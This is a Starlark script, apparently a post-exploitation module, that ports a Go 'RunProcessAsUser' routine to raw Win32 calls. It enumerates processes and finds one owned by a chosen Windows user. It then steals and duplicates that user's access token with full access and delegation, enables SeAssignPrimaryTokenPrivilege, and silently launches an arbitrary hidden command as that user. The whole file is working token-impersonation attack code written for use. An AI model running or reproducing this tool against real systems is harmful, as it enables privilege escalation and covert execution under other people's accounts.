# Starlark translation of RunProcessAsUser() from priv_windows.go
#
# func RunProcessAsUser(username, command, args string) (out string, err error) {
#     token, err := impersonateUser(username)
#     cmd := exec.Command(command, args)
#     cmd.SysProcAttr = &windows.SysProcAttr{Token: syscall.Token(token)}
#     output, err := cmd.Output()
#     out = string(output)
#     return
# }
#
# Go's exec.Command + SysProcAttr.Token maps to CreateProcessAsUserW in Win32.
# We implement it with the same token-stealing chain then CreateProcessAsUserW.
#
# Parameters:
#   args[0]  username  (string) – Windows user whose token to steal
#   args[1]  command   (string) – executable path
#   args[2]  cmd_args  (string) – arguments (may be empty)

# ── Windows constants ─────────────────────────────────────────────────────────
PROCESS_QUERY_INFORMATION = 0x0400
TOKEN_DUPLICATE = 0x0002
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_QUERY = 0x0008
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_ALL_ACCESS = 0x000F01FF
SecurityDelegation = 3
TokenPrimary = 1
SE_PRIVILEGE_ENABLED = 0x00000002
TH32CS_SNAPPROCESS = 0x00000002
CREATE_NO_WINDOW = 0x08000000
STARTF_USESHOWWINDOW = 0x00000001


# ── Memory helpers ────────────────────────────────────────────────────────────
def read_uint32(addr, offset):
    d = win_read_mem(addr + offset, 4)
    return d[0] | (d[1] << 8) | (d[2] << 16) | (d[3] << 24)


def read_ptr(addr, offset):
    d = win_read_mem(addr + offset, 8)
    return (
        d[0]
        | (d[1] << 8)
        | (d[2] << 16)
        | (d[3] << 24)
        | (d[4] << 32)
        | (d[5] << 40)
        | (d[6] << 48)
        | (d[7] << 56)
    )


def read_wstring(ptr):
    result = ""
    off = 0
    for _ in range(512):
        d = win_read_mem(ptr + off, 2)
        c = d[0] | (d[1] << 8)
        if c == 0:
            break
        result += chr(c)
        off += 2
    return result


def write_byte(addr, offset, val):
    win_call("msvcrt.dll", "memset", addr + offset, val & 0xFF, 1)


def write_uint16(addr, offset, val):
    write_byte(addr, offset, val & 0xFF)
    write_byte(addr, offset + 1, (val >> 8) & 0xFF)


def write_uint32(addr, offset, val):
    write_byte(addr, offset, val & 0xFF)
    write_byte(addr, offset + 1, (val >> 8) & 0xFF)
    write_byte(addr, offset + 2, (val >> 16) & 0xFF)
    write_byte(addr, offset + 3, (val >> 24) & 0xFF)


def utf16_ptr(s):
    p = win_alloc((len(s) + 1) * 2)
    for i in range(len(s)):
        c = ord(s[i : i + 1])
        write_byte(p, i * 2, c & 0xFF)
        write_byte(p, i * 2 + 1, (c >> 8) & 0xFF)
    write_byte(p, len(s) * 2, 0)
    write_byte(p, len(s) * 2 + 1, 0)
    return p


# ── Replaces ps.Processes(true) ───────────────────────────────────────────────
PROCESSENTRY32W_SIZE = 560


def snapshot_processes():
    h_snap = win_call(
        "kernel32.dll", "CreateToolhelp32Snapshot", TH32CS_SNAPPROCESS, 0
    )["r1"]
    if h_snap == 0 or h_snap == 0xFFFFFFFFFFFFFFFF:
        return []
    entry = win_alloc(PROCESSENTRY32W_SIZE)
    write_uint32(entry, 0, PROCESSENTRY32W_SIZE)
    procs = []
    res = win_call("kernel32.dll", "Process32FirstW", h_snap, entry)
    while res["r1"] != 0:
        pid = read_uint32(entry, 8)
        name = read_wstring(entry + 44)
        procs.append({"pid": pid, "name": name})
        res = win_call("kernel32.dll", "Process32NextW", h_snap, entry)
    win_free(entry)
    win_call("kernel32.dll", "CloseHandle", h_snap)
    return procs


# ── Replaces proc.Owner() ─────────────────────────────────────────────────────
def get_process_owner(pid):
    h_proc = win_call("kernel32.dll", "OpenProcess", PROCESS_QUERY_INFORMATION, 0, pid)[
        "r1"
    ]
    if h_proc == 0:
        return ""
    tok_ptr = win_alloc(8)
    res = win_call("advapi32.dll", "OpenProcessToken", h_proc, TOKEN_QUERY, tok_ptr)
    win_call("kernel32.dll", "CloseHandle", h_proc)
    if res["r1"] == 0:
        win_free(tok_ptr)
        return ""
    h_tok = read_ptr(tok_ptr, 0)
    win_free(tok_ptr)
    TokenUser = 1
    sz_ptr = win_alloc(4)
    win_call("advapi32.dll", "GetTokenInformation", h_tok, TokenUser, 0, 0, sz_ptr)
    sz = read_uint32(sz_ptr, 0)
    win_free(sz_ptr)
    if sz == 0:
        win_call("kernel32.dll", "CloseHandle", h_tok)
        return ""
    buf = win_alloc(sz)
    sz_ptr2 = win_alloc(4)
    win_call("advapi32.dll", "GetTokenInformation", h_tok, TokenUser, buf, sz, sz_ptr2)
    win_free(sz_ptr2)
    win_call("kernel32.dll", "CloseHandle", h_tok)
    sid_ptr = read_ptr(buf, 0)
    cn_ptr = win_alloc(4)
    dn_ptr = win_alloc(4)
    use_ptr = win_alloc(4)
    win_call(
        "advapi32.dll", "LookupAccountSidW", 0, sid_ptr, 0, cn_ptr, 0, dn_ptr, use_ptr
    )
    ns = read_uint32(cn_ptr, 0)
    ds = read_uint32(dn_ptr, 0)
    if ns == 0:
        ns = 256
    if ds == 0:
        ds = 256
    nb = win_alloc(ns * 2)
    db2 = win_alloc(ds * 2)
    win_call(
        "advapi32.dll",
        "LookupAccountSidW",
        0,
        sid_ptr,
        nb,
        cn_ptr,
        db2,
        dn_ptr,
        use_ptr,
    )
    acct = read_wstring(nb)
    dom = read_wstring(db2)
    win_free(cn_ptr)
    win_free(dn_ptr)
    win_free(use_ptr)
    win_free(nb)
    win_free(db2)
    win_free(buf)
    return dom + "\\" + acct


# ── getPrimaryToken ────────────────────────────────────────────────────────────
def getPrimaryToken(pid):
    # handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
    handle = win_call("kernel32.dll", "OpenProcess", PROCESS_QUERY_INFORMATION, 1, pid)[
        "r1"
    ]
    if handle == 0:
        return 0
    token_ptr = win_alloc(8)
    # err = windows.OpenProcessToken(handle,
    #     windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY|windows.TOKEN_QUERY, &token)
    res = win_call(
        "advapi32.dll",
        "OpenProcessToken",
        handle,
        TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
        token_ptr,
    )
    # defer windows.CloseHandle(handle)
    win_call("kernel32.dll", "CloseHandle", handle)
    if res["r1"] == 0:
        win_free(token_ptr)
        return 0
    token = read_ptr(token_ptr, 0)
    win_free(token_ptr)
    return token


# ── enableCurrentThreadPrivilege ───────────────────────────────────────────────
def enableCurrentThreadPrivilege(privilegeName):
    # ct, err := windows.GetCurrentThread()
    ct = win_call("kernel32.dll", "GetCurrentThread")["r1"]
    t_ptr = win_alloc(8)
    # err = windows.OpenThreadToken(ct, windows.TOKEN_QUERY|windows.TOKEN_ADJUST_PRIVILEGES, true, &t)
    res = win_call(
        "advapi32.dll",
        "OpenThreadToken",
        ct,
        TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
        1,
        t_ptr,
    )
    if res["r1"] == 0:
        win_free(t_ptr)
        return False
    t = read_ptr(t_ptr, 0)
    win_free(t_ptr)
    tp = win_alloc(24)
    privStr = utf16_ptr(privilegeName)
    # err = windows.LookupPrivilegeValue(nil, privStr, &tp.Privileges[0].Luid)
    res = win_call("advapi32.dll", "LookupPrivilegeValueW", 0, privStr, tp + 8)
    win_free(privStr)
    if res["r1"] == 0:
        win_free(tp)
        win_call("kernel32.dll", "CloseHandle", t)
        return False
    write_uint32(tp, 0, 1)  # tp.PrivilegeCount = 1
    write_uint32(tp, 4, 0)
    write_uint32(tp, 16, SE_PRIVILEGE_ENABLED)  # tp.Privileges[0].Attributes
    # return windows.AdjustTokenPrivileges(t, false, &tp, 0, nil, nil)
    res = win_call("advapi32.dll", "AdjustTokenPrivileges", t, 0, tp, 0, 0, 0)
    win_free(tp)
    win_call("kernel32.dll", "CloseHandle", t)
    return res["r1"] != 0


# ── impersonateProcess ─────────────────────────────────────────────────────────
def impersonateProcess(pid):
    requiredPrivileges = ["SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege"]
    primaryToken = getPrimaryToken(pid)
    if primaryToken == 0:
        return 0
    # err = syscalls.ImpersonateLoggedOnUser(*primaryToken)
    res = win_call("advapi32.dll", "ImpersonateLoggedOnUser", primaryToken)
    if res["r1"] == 0:
        win_call("kernel32.dll", "CloseHandle", primaryToken)
        return 0
    newToken_ptr = win_alloc(8)
    # err = windows.DuplicateTokenEx(*primaryToken, windows.TOKEN_ALL_ACCESS, &attr,
    #     windows.SecurityDelegation, windows.TokenPrimary, &newToken)
    res = win_call(
        "advapi32.dll",
        "DuplicateTokenEx",
        primaryToken,
        TOKEN_ALL_ACCESS,
        0,
        SecurityDelegation,
        TokenPrimary,
        newToken_ptr,
    )
    win_call("kernel32.dll", "CloseHandle", primaryToken)
    if res["r1"] == 0:
        win_free(newToken_ptr)
        return 0
    newToken = read_ptr(newToken_ptr, 0)
    win_free(newToken_ptr)
    for priv in requiredPrivileges:
        ok = enableCurrentThreadPrivilege(priv)
        if not ok:
            win_call("kernel32.dll", "CloseHandle", newToken)
            return 0
    return newToken


# ── impersonateUser ────────────────────────────────────────────────────────────
def impersonateUser(username):
    if not username:
        print("[-] username can't be empty")
        return 0
    # p, err := ps.Processes(true)
    procs = snapshot_processes()
    for proc in procs:
        # if proc.Owner() == username {
        owner = get_process_owner(proc["pid"])
        owner_user = owner.split("\\")[-1] if "\\" in owner else owner
        if owner.lower() == username.lower() or owner_user.lower() == username.lower():
            # token, err = impersonateProcess(uint32(proc.Pid()))
            token = impersonateProcess(proc["pid"])
            if token != 0:
                return token
    # windows.RevertToSelf()
    win_call("advapi32.dll", "RevertToSelf")
    print("[-] Could not acquire a token belonging to: " + username)
    return 0


# ── RunProcessAsUser ───────────────────────────────────────────────────────────
def RunProcessAsUser(username, command, cmd_args):
    """
    func RunProcessAsUser(username, command, args string) (out string, err error) {
        token, err := impersonateUser(username)
        cmd := exec.Command(command, args)
        cmd.SysProcAttr = &windows.SysProcAttr{Token: syscall.Token(token)}
        output, err := cmd.Output()
        out = string(output)
        return
    }
    exec.Command + SysProcAttr.Token maps to CreateProcessAsUserW.
    """
    # token, err := impersonateUser(username)
    token = impersonateUser(username)
    if token == 0:
        return

    # cmd := exec.Command(command, args)  →  build application + command-line
    prog = utf16_ptr(command)
    cmd_str = (command + " " + cmd_args).strip() if cmd_args else command
    cmd_line = utf16_ptr(cmd_str)

    # cmd.SysProcAttr = &windows.SysProcAttr{Token: syscall.Token(token)}
    # → use token in CreateProcessAsUserW
    si = win_alloc(104)
    write_uint32(si, 0, 104)  # cb
    write_uint32(si, 60, STARTF_USESHOWWINDOW)
    write_uint16(si, 64, 0)  # SW_HIDE

    pi = win_alloc(24)

    # output, err := cmd.Output()  →  CreateProcessAsUserW (cmd.Output uses cmd.Run internally)
    res = win_call(
        "advapi32.dll",
        "CreateProcessAsUserW",
        token,
        prog,
        cmd_line,
        0,  # lpProcessAttributes
        0,  # lpThreadAttributes
        0,  # bInheritHandles = FALSE
        CREATE_NO_WINDOW,
        0,  # lpEnvironment (inherit)
        0,  # lpCurrentDirectory (inherit)
        si,
        pi,
    )

    if res["r1"] == 0:
        err_code = res.get("err_code", 0)
        err_msg = res.get("error", "")
        print("[-] CreateProcessAsUserW failed. Error %d: %s" % (err_code, err_msg))
    else:
        new_pid = read_uint32(pi, 16)
        print(
            "[+] Started '%s %s' as '%s'  PID=%d"
            % (command, cmd_args, username, new_pid)
        )
        win_call("kernel32.dll", "CloseHandle", read_ptr(pi, 0))
        win_call("kernel32.dll", "CloseHandle", read_ptr(pi, 8))

    win_free(prog)
    win_free(cmd_line)
    win_free(si)
    win_free(pi)
    win_call("kernel32.dll", "CloseHandle", token)
    win_call("advapi32.dll", "RevertToSelf")


def main(*args):
    username = args[0] if len(args) > 0 else ""
    command = args[1] if len(args) > 1 else ""
    cmd_args = args[2] if len(args) > 2 else ""

    if str(cmd_args).lower() in ("false", "none"):
        cmd_args = ""
    if not username or not command:
        print("[-] Usage: runasuser <username> <command> [args]")
        return

    print("[*] RunProcessAsUser: '%s %s' as '%s'" % (command, cmd_args, username))
    RunProcessAsUser(username, command, cmd_args)


main()
